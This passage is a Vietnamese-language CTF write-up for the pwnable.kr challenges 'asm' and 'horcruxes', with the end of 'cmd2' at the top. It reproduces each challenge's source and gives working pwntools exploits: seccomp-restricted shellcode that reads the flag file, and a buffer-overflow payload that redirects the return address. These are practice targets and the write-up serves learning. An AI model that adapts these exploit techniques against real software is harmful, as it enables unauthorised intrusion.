cmd2@ubuntu:~$ ./cmd2 'command -p cat *fl*'
command -p cat *fl*
Shell_variables_can_be_quite_fun_to_play_with!
```

# asm

## Description

```c
Mommy! I think I know how to make shellcode

ssh asm@pwnable.kr -p2222 (pw: guest)
```

## Source

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}

```

## Solution

Câu này là dạng seccomp, nghĩa là nó có thể chặn các hành động của syscall. Dùng `seccomp-tools` là sẽ nhận diện được :

```c
 seccomp-tools dump ./asm
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: 123
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL 
```

Ở đây nó cho thực thi lệnh `read`, `write`, `open` → Đủ đọc flag :> 

Vậy chỉ cần tạo shell để mở, đọc vài in ra file trong màn hình thôi :> Trong shellcode của mình là mình sẽ gọi tới 1 luồng nhập vào và mở file với tên của luồng đó. 

## Payload

```c
from pwn import *
import sys

if len(sys.argv) <= 2:
    p = process("./" + sys.argv[1])
    e = ELF("./" + sys.argv[1], checksec=False)

else:
    remote_addr = sys.argv[1]
    remote_port = sys.argv[2]
    p = remote(remote_addr, int(remote_port))

context.log_level = 'DEBUG'
context.arch = 'amd64'

filename = b"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00"

shellcode = asm(f"""
xor eax, eax      
xor edi, edi     
mov rsi, rsp
mov dl, 0xff 
syscall

mov rdi, rsp
xor esi, esi
mov al, 2
syscall

mov rdi, rax
mov rsi, rsp
mov dl, 0xff
xor eax, eax
syscall

mov rdx, rax
mov dil, 1
mov al, 1
syscall
""")

payload = shellcode
p.sendlineafter(b'give me your x64 shellcode:', payload)
p.sendlineafter(b'',filename)
p.interactive()
```

# horcruxes

## Description

```c
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and ROP it!
author: jiwon choi

ssh horcruxes@pwnable.kr -p2222 (pw:guest)
```

## Source

using IDA to reverse and get source.

```c
int A()
{
  return printf("You found \"Tom Riddle's Diary\" (EXP +%d)\n", a);
}
```

```c
int B()
{
  return printf("You found \"Marvolo Gaunt's Ring\" (EXP +%d)\n", b);
}
```

```c
int C()
{
  return printf("You found \"Helga Hufflepuff's Cup\" (EXP +%d)\n", c);
}
```

```c
int D()
{
  return printf("You found \"Salazar Slytherin's Locket\" (EXP +%d)\n", d);
}
```

```c
int E()
{
  return printf("You found \"Rowena Ravenclaw's Diadem\" (EXP +%d)\n", e);
}
```

```c
int F()
{
  return printf("You found \"Nagini the Snake\" (EXP +%d)\n", f);
}
```

```c
int G()
{
  return printf("You found \"Harry Potter\" (EXP +%d)\n", g);
}
```

```c
int ropme()
{
  char s[100]; // [esp+4h] [ebp-74h] BYREF
  int v2; // [esp+68h] [ebp-10h] BYREF
  int fd; // [esp+6Ch] [ebp-Ch]

  printf("Select Menu:");
  __isoc99_scanf("%d", &v2);
  getchar();
  if ( v2 == a )
  {
    A();
  }
  else if ( v2 == b )
  {
    B();
  }
  else if ( v2 == c )
  {
    C();
  }
  else if ( v2 == d )
  {
    D();
  }
  else if ( v2 == e )
  {
    E();
  }
  else if ( v2 == f )
  {
    F();
  }
  else if ( v2 == g )
  {
    G();
  }
  else
  {
    printf("How many EXP did you earned? : ");
    gets(s);
    if ( atoi(s) == sum )
    {
      fd = open("/home/horcruxes_pwn/flag", 0);
      s[read(fd, s, 0x64u)] = 0;
      puts(s);
      close(fd);
      exit(0);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
  return 0;
}
```

```c
int init_ABCDEFG()
{
  int result; // eax
  unsigned int buf; // [esp+8h] [ebp-10h] BYREF
  int fd; // [esp+Ch] [ebp-Ch]

  fd = open("/dev/urandom", 0);
  if ( read(fd, &buf, 4u) != 4 )
  {
    puts("/dev/urandom error");
    exit(0);
  }
  close(fd);
  srand(buf);
  a = -559038737 * rand() % 0xCAFEBABE;
  b = -559038737 * rand() % 0xCAFEBABE;
  c = -559038737 * rand() % 0xCAFEBABE;
  d = -559038737 * rand() % 0xCAFEBABE;
  e = -559038737 * rand() % 0xCAFEBABE;
  f = -559038737 * rand() % 0xCAFEBABE;
  g = -559038737 * rand() % 0xCAFEBABE;
  result = f + e + d + c + b + a + g;
  sum = result;
  return result;
}
```

```c
int hint()
{
  puts("Voldemort concealed his splitted soul inside 7 horcruxes.");
  return puts("Find all horcruxes, and destroy it!\n");
}
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+0h] [ebp-Ch]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  alarm(0x3Cu);
  hint();
  init_ABCDEFG();
  v4 = seccomp_init(0);
  seccomp_rule_add(v4, 2147418112, 173, 0);
  seccomp_rule_add(v4, 2147418112, 5, 0);
  seccomp_rule_add(v4, 2147418112, 295, 0);
  seccomp_rule_add(v4, 2147418112, 3, 0);
  seccomp_rule_add(v4, 2147418112, 4, 0);
  seccomp_rule_add(v4, 2147418112, 252, 0);
  seccomp_load(v4);
  return ropme();
}
```

Checksec :

```c
Arch:     i386
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8040000)
Stripped:   No
```

## Solution

Bug ở đây là gọi tới hàm nhập `gets()`. Ta có chương trình là địa chỉ tĩnh và không có canary, khả năng cao là bof và dẫn đến tạo ROP chain.

Vì có sẵn đoạn code đọc flag nếu thõa yêu cầu, ta sẽ bof địa chỉ trả về là địa chỉ của câu lệnh bắt đầu đọc flag và thêm 1 chút tùy chỉnh là được.

## Payload

```python
from pwn import *
import sys

if len(sys.argv) <= 2:
    p = process("./" + sys.argv[1])
    e = ELF("./" + sys.argv[1], checksec=False)

    gdb.attach(p,
'''
b*0x08041604
b*ropme
'''
)
else:
    remote_addr = sys.argv[1]
    remote_port = sys.argv[2]
    p = remote(remote_addr, int(remote_port))

context.log_level = 'DEBUG'
context.arch = 'amd64'

flag_path = 0x8042174+0x1e1c
ropme_282 = 0x08041625
valid_address = 0x8044300
payload = b'a'*112 + p32(flag_path) + p32(valid_address) +  p32(ropme_282)

p.sendlineafter(b'Find all horcruxes, and destroy it!', b'1')
p.sendlineafter(b'How many EXP did you earned?', payload)

p.interactive()
```

Doneeeeeeee ! Rookiss go go brrr brrr !